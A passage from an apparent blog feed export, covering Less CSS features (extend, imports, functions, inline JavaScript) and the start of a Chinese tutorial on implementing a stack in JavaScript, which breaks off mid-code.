class="comment">/* 生成后的 CSS */</span></span><br><span class="line"><span class="selector-class">.animation</span>,<span class="selector-id">#main</span>&#123;</span><br><span class="line">  <span class="attribute">transition</span>: all .<span class="number">3s</span> ease-out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.animation</span> <span class="selector-class">.hide</span> , <span class="selector-id">#con</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>:<span class="built_in">scale</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p><strong>all 全局搜索替换</strong></p><p>使用选择器匹配到的 全部声明。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#main</span> &#123;</span><br><span class="line">  &amp;:after &#123;</span><br><span class="line">    content:<span class="string">&quot;Less is good!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#wrap</span>:<span class="built_in">extend</span>(#main all) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成的 CSS */</span></span><br><span class="line"><span class="selector-id">#main</span>,<span class="selector-id">#wrap</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#main</span>:after, #wrap:after &#123;</span><br><span class="line">    content: <span class="string">&quot;Less is good!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p><strong>减少代码的重复性</strong></p><p>从表面 看来，extend 与 方法 最大的差别，就是 extend 是同个选择器共用同一个声明，而 方法 是使用自己的声明，这无疑 增加了代码的重复性。</p><p>方法示例 与上面的 extend 进行对比：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line"><span class="selector-class">.Method</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  &amp;:after &#123;</span><br><span class="line">      content:<span class="string">&quot;Less is good!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">  <span class="selector-class">.Method</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#wrap</span>&#123;</span><br><span class="line">  <span class="selector-class">.Method</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成的 CSS */</span></span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  &amp;:after&#123;</span><br><span class="line">    content:<span class="string">&quot;Less is good!&quot;</span>;</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#wrap</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  &amp;:after&#123;</span><br><span class="line">    content:<span class="string">&quot;Less is good!&quot;</span>;</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p><strong>要点</strong></p><p><em>翻译官网</em></p><ul><li>选择器和扩展之间 是允许有空格的：pre:hover :extend(div pre).</li><li>可以有多个扩展: pre:hover:extend(div pre):extend(.bucket tr) - 注意这与 pre:hover:extend(div pre, .bucket tr)一样。</li><li>这是不可以的，扩展必须在最后 : pre:hover:extend(div pre).nth-child(odd)。</li><li>如果一个规则集包含多个选择器，所有选择器都可以使用extend关键字。</li></ul><h3 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h3><ol><li>导入 less 文件 可省略后缀</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import &quot;<span class="selector-tag">main</span>&quot;; </span><br><span class="line">//等价于</span><br><span class="line">import &quot;<span class="selector-tag">main</span><span class="selector-class">.less</span>&quot;;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><ol><li><code>@import</code> 的位置可随意放置</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">  <span class="attribute">font-size</span>:<span class="number">15px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@import</span> <span class="string">&quot;style&quot;</span>;</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p><strong>reference</strong></p><p>Less 中 最强大的特性 使用 引入的 Less 文件，但不会 编译它。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line"><span class="keyword">@import</span> (reference) <span class="string">&quot;bootstrap.less&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="selector-id">#wrap</span>:<span class="built_in">extend</span>(.navbar all)&#123;&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>翻译官网：</p><blockquote><p>使用@import (reference)导入外部文件，但不会添加 把导入的文件 编译到最终输出中，只引用。</p></blockquote></li><li><p><strong>once</strong></p><blockquote><p>@import语句的默认行为。这表明相同的文件只会被导入一次，而随后的导入文件的重复代码都不会解析。</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@import</span> (once) <span class="string">&quot;foo.less&quot;</span>;</span><br><span class="line"><span class="keyword">@import</span> (once) <span class="string">&quot;foo.less&quot;</span>; // this statement will be ignored</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p><strong>multiple</strong></p><blockquote><p>使用@import (multiple)允许导入多个同名文件。</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line"></span><br><span class="line">// file: foo.less</span><br><span class="line">.a &#123;</span><br><span class="line">  color: green;</span><br><span class="line">&#125;</span><br><span class="line">// file: main.less</span><br><span class="line">@import (multiple) <span class="string">&quot;foo.less&quot;</span>;</span><br><span class="line"><span class="keyword">@import</span> (multiple) <span class="string">&quot;foo.less&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成后的 CSS */</span></span><br><span class="line"><span class="selector-class">.a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: green;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: green;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li></ol><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><ol><li><p><strong>判断类型</strong></p><ul><li>isnumber</li></ul><blockquote><p>判断给定的值 是否 是一个数字。</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">isnumber(<span class="selector-id">#ff0</span>);     // false</span><br><span class="line">isnumber(blue);     // false</span><br><span class="line">isnumber(&quot;string&quot;); // false</span><br><span class="line">isnumber(<span class="number">1234</span>);     // true</span><br><span class="line">isnumber(<span class="number">56px</span>);     // true</span><br><span class="line">isnumber(<span class="number">7.8%</span>);     // true</span><br><span class="line">isnumber(keyword);  // false</span><br><span class="line">isnumber(url(...)); // false</span><br><span class="line">  </span><br></pre></td></tr></table></figure><ul><li>iscolor</li></ul><blockquote><p>判断给定的值 是否 是一个颜色。</p></blockquote><ul><li>isurl</li></ul><blockquote><p>判断给定的值 是否 是一个 url 。</p></blockquote></li><li><p><strong>颜色操作</strong></p><ul><li>saturate</li></ul><blockquote><p>增加一定数值的颜色饱和度。</p></blockquote><ul><li>lighten</li></ul><blockquote><p>增加一定数值的颜色亮度。</p></blockquote><ul><li>darken</li></ul><blockquote><p>降低一定数值的颜色亮度。</p></blockquote><ul><li>fade</li></ul><blockquote><p>给颜色设定一定数值的透明度。</p></blockquote><ul><li>mix</li></ul><blockquote><p>根据比例混合两种颜色。</p></blockquote></li><li><p><strong>数学函数</strong></p><ul><li>ceil</li></ul><blockquote><p>向上取整。</p></blockquote><ul><li>floor</li></ul><blockquote><p>向下取整。</p></blockquote><ul><li>percentage</li></ul><blockquote><p>将浮点数转换为百分比字符串。</p></blockquote><ul><li>round</li></ul><blockquote><p>四舍五入。</p></blockquote><ul><li>sqrt</li></ul><blockquote><p>计算一个数的平方根。</p></blockquote><ul><li>abs</li></ul><blockquote><p>计算数字的绝对值，原样保持单位。</p></blockquote><ul><li>pow</li></ul><blockquote><p>计算一个数的乘方。</p></blockquote></li></ol><p>由于 文章 篇幅有限，所以 只能介绍一些 使用效率高的函数。</p><p>如果你想了解更多，可以去官网的<a href="https://link.juejin.cn/?target=http://lesscss.cn/functions/">函数链接</a></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol><li><p><strong>注释</strong></p><ul><li>/* */ CSS原生注释，会被编译在 CSS 文件中。</li><li>/  / Less提供的一种注释，不会被编译在 CSS 文件中。</li></ul></li><li><p><strong>避免编译</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>:~<span class="string">&#x27;calc(300px-30px)&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成后的 CSS */</span></span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>:<span class="built_in">calc</span>(<span class="number">300px</span>-<span class="number">30px</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>结构： <code>~&#39; 值 &#39;</code></p></li><li><p><strong>变量拼串</strong></p><p>在平时工作中，这种需求 太常见了。 在下面例子中， 实现了不同的 transtion-delay、animation、@keyframes</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.judge</span>(<span class="keyword">@i</span>) when(@i=<span class="number">1</span>)&#123;</span><br><span class="line">  @size:15px;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.judge</span>(<span class="keyword">@i</span>) when(@i&gt;<span class="number">1</span>)&#123;</span><br><span class="line">  @size:16px;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.loopAnimation</span>(<span class="keyword">@i</span>) when (@i&lt;<span class="number">16</span>) &#123;</span><br><span class="line">  </span><br><span class="line">  <span class="selector-class">.circle</span><span class="selector-pseudo">:nth-child</span>(@&#123;<span class="selector-tag">i</span>&#125;)&#123;</span><br><span class="line">      <span class="selector-class">.judeg</span>(<span class="keyword">@i</span>);</span><br><span class="line">      <span class="attribute">border-radius</span>:@size @size <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">      <span class="attribute">animation</span>: ~<span class="string">&quot;circle-@&#123;i&#125;&quot;</span> @duration infinite @ease;</span><br><span class="line">      <span class="attribute">transition-delay</span>:~<span class="string">&quot;@&#123;i&#125;ms&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">@keyframes</span> ~<span class="string">&quot;circle-@&#123;i&#125;&quot;</span> &#123;</span><br><span class="line">      // do something...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.loopAnimation</span>(<span class="keyword">@i</span> + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>结构： <code>~&quot;字符@&#123;变量&#125;字符&quot;</code>;</p></li><li><p><strong>使用 JS</strong></p><p>因为 Less 是由 JS 编写，所以 Less 有一得天独厚的特性：代码中使用 Javascript 。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line">@content:`&quot;aaa&quot;.toUpperCase()`;</span><br><span class="line"><span class="selector-id">#randomColor</span>&#123;</span><br><span class="line">  @randomColor: ~&quot;rgb(`Math.round(Math.random() * 256)`,`Math.round(Math.random() * 256)`,`Math.round(Math.random() * 256)`)&quot;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#wrap</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: ~<span class="string">&quot;`Math.round(Math.random() * 100)`px&quot;</span>;</span><br><span class="line">  &amp;:after&#123;</span><br><span class="line">      content:@content;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="attribute">height</span>: ~<span class="string">&quot;`window.innerHeight`px&quot;</span>;</span><br><span class="line">  alert:~<span class="string">&quot;`alert(1)`&quot;</span>;</span><br><span class="line">  <span class="selector-id">#randomColor</span>();</span><br><span class="line">  <span class="attribute">background-color</span>: @randomColor;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 生成后的 CSS */</span></span><br><span class="line"></span><br><span class="line">// 弹出 <span class="number">1</span></span><br><span class="line"><span class="selector-id">#wrap</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: 随机值（<span class="number">0</span>~<span class="number">100</span>）px;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">743px</span>;//由电脑而异</span><br><span class="line">  <span class="attribute">background</span>: 随机颜色;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#wrap</span><span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">  <span class="attribute">content</span>:<span class="string">&quot;AAA&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CSS" scheme="http://aiolimp.com/categories/CSS/"/>
    
    
    <category term="CSS" scheme="http://aiolimp.com/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript实现栈结构（Stack）</title>
    <link href="http://aiolimp.com/2022/07/11/JavaScript%E5%AE%9E%E7%8E%B0%E6%A0%88%E7%BB%93%E6%9E%84%EF%BC%88Stack%EF%BC%89/"/>
    <id>http://aiolimp.com/2022/07/11/JavaScript%E5%AE%9E%E7%8E%B0%E6%A0%88%E7%BB%93%E6%9E%84%EF%BC%88Stack%EF%BC%89/</id>
    <published>2022-07-11T02:23:20.000Z</published>
    <updated>2023-03-05T14:22:44.396Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="JavaScript实现栈结构（Stack）"><a href="#JavaScript实现栈结构（Stack）" class="headerlink" title="JavaScript实现栈结构（Stack）"></a>JavaScript实现栈结构（Stack）</h1><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><h4 id="1-1-什么是数据结构？"><a href="#1-1-什么是数据结构？" class="headerlink" title="1.1.什么是数据结构？"></a>1.1.什么是数据结构？</h4><p>数据结构就是在计算机中，存储和组织数据的方式。</p><p>例如：图书管理，怎样摆放图书才能既能放很多书，也方便取？</p><p>主要需要考虑两个问题：</p><ul><li>操作一：新书怎么插入？</li><li>操作二：怎么找到某本指定的书？</li></ul><p><strong>常见的数据结构：</strong></p><ul><li><strong>数组</strong>（Aarray）</li><li><strong>栈</strong>（Stack）</li><li><strong>链表</strong>（Linked List）</li><li><strong>图</strong>（Graph）</li><li><strong>散列表</strong>（Hash）</li><li><strong>队列</strong>（Queue）</li><li><strong>树</strong>（Tree）</li><li><strong>堆</strong>（Heap）</li></ul><p><strong>注意</strong>：数据结构与算法与语言无关，常见的编程语言都有<strong>直接或间接</strong>的使用上述常见的数据结构</p><h4 id="1-2-什么是算法？"><a href="#1-2-什么是算法？" class="headerlink" title="1.2.什么是算法？"></a>1.2.什么是算法？</h4><p>算法（Algorithm）的定义</p><ul><li>一个有限指令集，每条指令的描述不依赖于语言；</li><li>接收一些输入（有些情况下不需要输入）；</li><li>产生输入；</li><li>一定在有限步骤之后终止；</li></ul><p>算法通俗理解：解决问题的办法/步骤逻辑。数据结构的实现，离不开算法。</p><h3 id="二、栈结构（Stack）"><a href="#二、栈结构（Stack）" class="headerlink" title="二、栈结构（Stack）"></a>二、栈结构（Stack）</h3><h4 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1.简介"></a>2.1.简介</h4><p>数组是一个线性结构，并且可以在数组的<strong>任意位置</strong>插入和删除元素。而<strong>栈和队列</strong>就是比较常见的<strong>受限的线性结构</strong>。如下图所示：</p><p><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%88/1.png" alt="image-20200226131817102"></p><p>栈的特点为<strong>先进后出，后进先出</strong>（LIFO：last in first out）。</p><p><strong>程序中的栈结构：</strong></p><ul><li><strong>函数调用栈</strong>：A（B（C（D（））））：即A函数中调用B，B调用C，C调用D；在A执行的过程中会将A压入栈，随后B执行时B也被压入栈，函数C和D执行时也会被压入栈。所以当前栈的顺序为：A-&gt;B-&gt;C-&gt;D（栈顶）；函数D执行完之后，会弹出栈被释放，弹出栈的顺序为D-&gt;C-&gt;B-&gt;A;</li><li><strong>递归</strong>：为什么没有停止条件的递归会造成栈溢出？比如函数A为递归函数，不断地调用自己（因为函数还没有执行完，不会把函数弹出栈），不停地把相同的函数A压入栈，最后造成<strong>栈溢出</strong>（Stack Overfloat）</li></ul><p>3.练习：题目：有6个元素6，5，4，3，2，1按顺序进栈，问下列哪一个不是合法的出栈顺序？</p><ul><li>A：5 4 3 6 1 2 （√）</li><li>B：4 5 3 2 1 6 （√）</li><li>C：3 4 6 5 2 1 （×）</li><li>D：2 3 4 1 5 6 （√）</li></ul><p>题目所说的按顺序进栈指的不是一次性全部进栈，而是有进有出，进栈顺序为6 -&gt; 5 -&gt; 4 -&gt; 3 -&gt; 2 -&gt; 1。</p><p>解析：</p><ul><li>A答案：65进栈，5出栈，4进栈出栈，3进栈出栈，6出栈，21进栈，1出栈，2出栈（整体入栈顺序符合654321）;</li><li>B答案：654进栈，4出栈，5出栈，3进栈出栈，2进栈出栈，1进栈出栈，6出栈（整体的入栈顺序符合654321）;</li><li>C答案：6543进栈，3出栈，4出栈，之后应该5出栈而不是6，所以错误；</li><li>D答案：65432进栈，2出栈，3出栈，4出栈，1进栈出栈，5出栈，6出栈。符合入栈顺序；</li></ul><p><strong>栈常见的操作：</strong></p><ul><li>push（element）：添加一个新元素到栈顶位置；</li><li>pop（）：移除栈顶的元素，同时返回被移除的元素；</li><li>peek（）：返回栈顶的元素，不对栈做任何修改（该方法不会移除栈顶的元素，仅仅返回它）；</li><li>isEmpty（）：如果栈里没有任何元素就返回true，否则返回false；</li><li>size（）：返回栈里的元素个数。这个方法和数组的length属性类似；</li><li>toString（）：将栈结构的内容以字符串的形式返回。</li></ul><h4 id="2-2-封装栈类"><a href="#2-2-封装栈类" class="headerlink" title="2.2.封装栈类"></a>2.2.封装栈类</h4><p><strong>代码实现：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 封装栈类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Stack</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 栈中的属性</span></span><br><span class="line">  <span class="built_in">this</span>.items =[]</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 栈的相关操作</span></span><br><span class="line">  <span class="comment">// 1.push():将元素压入栈</span></span><br><span class="line">  <span class="comment">//方式一(不推荐)：给对象添加方法，其他对象不能复用</span></span><br><span class="line">  <span class="comment">// this.push = () =&gt; &#123;</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//方式二(推荐)：给Stack类添加方法，能够多对象复用</span></span><br><span class="line">  Stack.prototype.push = <span class="function"><span class="keyword">function</span>(<span class="params">element</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 利用数组item的push方法实现Stack类的pop方法</span></span><br><span class="line">    <span class="built_in">this</span>.items.push(element)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2.pop():从栈中取出元素</span></span><br><span class="line">  Stack.prototype.pop = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 利用数组item的pop方法实现Stack类的pop方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.items.pop()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3.peek():查看一下栈顶元素</span></span><br><span class="line">  Stack.prototype.peek = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.items[<span class="built_in">this</span>.items.length - <span class="number">1</span>]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 4.isEmpty():判断栈是否为空</span></span><br><span class="line">  Stack.prototype.isEmpty = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 两个小时的教训啊不是this.length(不是Stack对象的length，Stack类没有length属性啊)，而是Stack类中定义的数组items才有length属性呀</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.items.length == <span class="number">0</span> </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 5.size():获取栈中元素的个数</span></span><br><span class="line">  Stack.prototype.size = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.items.length</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 6.toString():以字符串形式输出栈内数据</span></span><br><span class="line">  Stack.prototype.toString = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//希望输出的形式：20 10 12 8 7</span></span><br><span class="line">    <span class="keyword">let</span> resultString = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> <span class="built_in">this</span>.items)&#123;</span><br><span class="line">      resultString += i + <span class="string">&#x27; &#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resultString</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>测试代码：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 栈的使用</span></span><br><span class="line">   <span class="keyword">let</span>  s = <span class="keyword">new</span> Stack()</span><br><span class="line">   s.push(<span class="number">20</span>)</span><br><span class="line">   s.push(<span class="number">10</span>)</span><br><span class="line">   s.push(<span class="number">100</span>)</span><br><span class="line">   s.push(<span class="number">77</span>)</span><br><span class="line">   <span class="built_in">console</span>.log(s)<span class="comment">//65</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">console</span>.log(s.pop());<span class="comment">//68</span></span><br><span class="line">   <span class="built_in">console</span>.log(s.pop());<span class="comment">//69</span></span><br><span class="line">   </span><br><span class="line">   <span class="built_in">console</span>.log(s.peek());<span class="comment">//71</span></span><br><span class="line"><span class="built_in">console</span>.log(s.isEmpty());<span class="comment">//72</span></span><br><span class="line">  </span><br><span class="line">   <span class="built_in">console</span>.log(s.size());<span class="comment">//74</span></span><br><span class="line">   <span class="built_in">console</span>.log(s.toString());</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%88/2.png" alt="image-20200305205050816"></p><p><strong>栈结构的简单应用：</strong></p><p>利用栈结构的特点封装十进至转换为二进至的函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简单应用：</span></span><br><span class="line"><span 